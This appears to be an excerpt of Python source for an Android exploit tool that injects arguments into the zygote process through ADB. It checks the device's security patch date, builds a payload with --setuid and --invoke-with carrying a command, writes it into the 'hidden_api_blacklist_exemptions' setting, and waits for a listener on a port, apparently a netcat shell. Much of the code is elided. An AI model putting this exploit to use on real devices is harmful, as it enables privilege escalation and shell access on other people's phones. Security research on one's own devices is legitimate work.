...
class Stage1Exploit:
    ...
    def __init__(self, device_serial: Optional[str]=None, transport_id: Optional[str]=None, usb: bool=False, tcpip: bool=False, auto_connect: bool=True, adb_client: Optional[AdbClient]=None) -> None:
    ...
    def _remove_forward(self, port: int):
        ...
        AdbHelper.remove_forward(f'tcp:{port}', serial=self.device.serial if hasattr(self, 'device') and self.device else None, transport_id=self.transport_id, usb=self.usb, tcpip=self.tcpip)
    ...
    def connect(self, device_serial: Optional[str]) -> None:
        ...
        if self.transport_id:
            ...
            if not target:
                raise ZygoteInjectionDeviceNotFoundException(f'Transport ID {self.transport_id} not found')
            ...
            if not target:
                raise ZygoteInjectionNoDeviceException('No USB device found')
            device_serial = target['serial']
        elif self.tcpip:
            from .adb_helper import AdbHelper
            devs = AdbHelper.get_connected_devices()
            ...
            if not target:
                raise ZygoteInjectionNoDeviceException('No TCP/IP device found')
            device_serial = target['serial']
        if device_serial is None:
            if len(devices) == 1:
                ...
                raise ZygoteInjectionMultipleDevicesException('multiple devices found and no device has been explicitly specified')
        else:
            for current_device in devices:
                ...
                raise ZygoteInjectionDeviceNotFoundException(f'device with serial {repr(device_serial)} was not found')
        self.device = device

    def shell_execute(self, command: Union[list, str], allow_error: bool=False, separate_stdout_stderr: bool=True, timeout: Optional[float]=None) -> dict:
        try:
            command + ''
        except TypeError:
        ...
        result = self.device.shell_v2(escaped_command, separate_stdout_stderr=separate_stdout_stderr, timeout=timeout)
        if separate_stdout_stderr:
            stdout, stderr, exit_code = result
        else:
            output, exit_code = result
        if exit_code and (not allow_error):
            raise ZygoteInjectionCommandFailedException(f'command "{escaped_command}" failed with exit code {exit_code:d}')
        result = {}
        if allow_error:
    ...
    def exploit_type(self) -> str:
        ...
        if security_patch:
            security_patch_date = datetime.datetime.strptime(security_patch, '%Y-%m-%d').date()
            if security_patch_date >= EXPLOIT_PATCH_DATE:
                raise ZygoteInjectionNotVulnerableException(f"Your latest security patch is at {security_patch_date.strftime('%Y-%m-%d')}, but the exploit was patched on {EXPLOIT_PATCH_DATE.strftime('%Y-%m-%d')} :(Sorry!")
    ...
    def generate_stage1_exploit(command: str, exploit_type: str, uid: int=1000, gid: int=1000, seinfo: str='default') -> str:
        ...
        raw_zygote_arguments = [f'--setuid={uid}', f'--setgid={gid}', '--setgroups=3003', '--runtime-args', f'--seinfo={seinfo}', '--runtime-flags=1', '--nice-name=runmenetcat', '--invoke-with', f'{command}#']
        zygote_arguments = '\n'.join([f'{len(raw_zygote_arguments):d}'] + raw_zygote_arguments)
        if exploit_type == 'old':
    ...
    def exploit_stage1(self, uid: int=1000, gid: int=1000, port: int=1234, seinfo: Optional[str]=None, trigger_package: str='com.android.settings') -> bool:
        ...
        if self.is_port_open(port):
            ...
            if not should_restart:
                ...
                try:
                    ...
                    return False
        self.shell_execute(['settings', 'delete', 'global', 'hidden_api_blacklist_exemptions'])
        ...
        exploit_command = ['settings', 'put', 'global', 'hidden_api_blacklist_exemptions', exploit_value]
        ...
        for current_try in range(20):
            setting_value = self.get_setting('global', 'hidden_api_blacklist_exemptions')
            if setting_value == 'null':
                if self.is_port_open(port):
                    ...
                    raise ZygoteInjectionException('setting was deleted but no listener was found')
            time.sleep(0.5)
